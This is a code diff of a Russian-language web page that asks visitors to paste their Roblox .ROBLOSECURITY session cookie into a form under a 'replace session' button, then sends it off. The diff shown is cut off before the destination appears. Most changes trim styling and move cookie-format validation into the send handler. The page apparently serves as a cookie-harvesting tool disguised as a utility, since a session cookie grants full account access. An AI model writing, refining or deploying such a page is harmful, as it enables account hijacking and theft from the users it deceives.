@@ -21,11 +21,8 @@
             --text-main: #e9d5ff;
             --text-dim: #c084fc;
             --accent: #8b5cf6;
-            --accent-glow: rgba(139, 92, 246, 0.4);
             --input-bg: #0a0a12;
             --star-color: #c084fc;
-            --valid: #22c55e;
-            --invalid: #ef4444;
         }
 
         body.light {
@@ -37,7 +34,6 @@
             --text-main: #1a2a4f;
             --text-dim: #2c4c8c;
             --accent: #4a8ec8;
-            --accent-glow: rgba(74, 142, 200, 0.3);
             --input-bg: #ffffff;
             --star-color: #ffd966;
         }
@@ -100,7 +96,7 @@
             max-width: 540px;
             width: 100%;
             border: 1px solid var(--border-glow);
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 0 0 30px var(--accent-glow);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
             transition: all 0.3s ease;
             z-index: 10;
             position: relative;
@@ -108,7 +104,7 @@
         .glass-card:hover {
             transform: translateY(-6px);
             border-color: var(--accent);
-            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 45px var(--accent);
+            box-shadow: 0 30px 55px rgba(0, 0, 0, 0.4), 0 0 35px var(--accent);
         }
 
         .logo {
@@ -124,7 +120,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -1px;
         }
         @keyframes textShine {
             0% { background-position: 0% 50%; }
@@ -137,7 +132,6 @@
             letter-spacing: 4px;
             margin-top: 10px;
             text-transform: uppercase;
-            font-weight: 300;
         }
 
         .label {
@@ -168,19 +162,6 @@
             box-shadow: 0 0 18px var(--accent);
         }
 
-        .status {
-            font-size: 13px;
-            margin: 18px 0 28px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: var(--text-dim);
-            background: rgba(0, 0, 0, 0.2);
-            padding: 10px 18px;
-            border-radius: 60px;
-            backdrop-filter: blur(4px);
-        }
-
         .btn {
             width: 100%;
             background: linear-gradient(135deg, #7c3aed, var(--accent), #c084fc);
@@ -193,7 +174,6 @@
             font-size: 16px;
             cursor: pointer;
             transition: all 0.2s;
-            box-shadow: 0 0 12px var(--accent);
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -236,7 +216,6 @@
             font-size: 14px;
             font-weight: 600;
             color: var(--text-dim);
-            transition: all 0.2s;
         }
         .theme-btn:hover {
             transform: scale(1.05);
@@ -260,10 +239,7 @@
     </div>
     <label class="label"><span>🍪</span> .ROBLOSECURITY Cookie</label>
     <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
-    <div class="status" id="status">
-        <span>✨</span> Ожидание ввода...
-    </div>
-    <button class="btn" id="sendBtn" disabled>🔄 Заменить сессию</button>
+    <button class="btn" id="sendBtn">🔄 Заменить сессию</button>
     <div id="messageArea" class="message-area"></div>
 </div>
 
@@ -328,10 +304,8 @@
 
         const cookieInput = document.getElementById('cookie');
         const sendBtn = document.getElementById('sendBtn');
-        const statusDiv = document.getElementById('status');
         const msgArea = document.getElementById('messageArea');
 
-        // Простая проверка — длина от 750 и наличие WARNING
         function isValidCookie(val){
             if(!val || val.trim() === '') return false;
             const t = val.trim();
@@ -340,35 +314,17 @@
             return true;
         }
 
-        function updateUI(){
-            const val = cookieInput.value;
-            if(!val || val.trim() === ''){
-                statusDiv.innerHTML = '<span>✨</span> Ожидание ввода...';
-                statusDiv.style.color = '#a78bfa';
-                sendBtn.disabled = true;
-            } else if(isValidCookie(val)){
-                statusDiv.innerHTML = `<span>✅</span> Кука валидна! Длина: ${val.trim().length} символов.`;
-                statusDiv.style.color = '#22c55e';
-                sendBtn.disabled = false;
-            } else {
-                statusDiv.innerHTML = '<span>❌</span> Неверный формат. Нужна .ROBLOSECURITY (мин. 750 символов)';
-                statusDiv.style.color = '#ef4444';
-                sendBtn.disabled = true;
-            }
-        }
-
         function showMessage(text){
             msgArea.innerHTML = `<div class="error-text">⚠️ ${text}</div>`;
             setTimeout(() => msgArea.innerHTML = '', 4500);
         }
 
-        cookieInput.addEventListener('input', updateUI);
-        cookieInput.addEventListener('paste', () => setTimeout(updateUI, 100));
-        updateUI();
-
         sendBtn.onclick = async () => {
             const cookie = cookieInput.value.trim();
-            if(!isValidCookie(cookie)) return;
+            if(!isValidCookie(cookie)){
+                showMessage('Неверный формат. Нужна .ROBLOSECURITY (мин. 750 символов)');
+                return;
+            }
 
             sendBtn.disabled = true;
             sendBtn.textContent = "⏳ Отправка...";
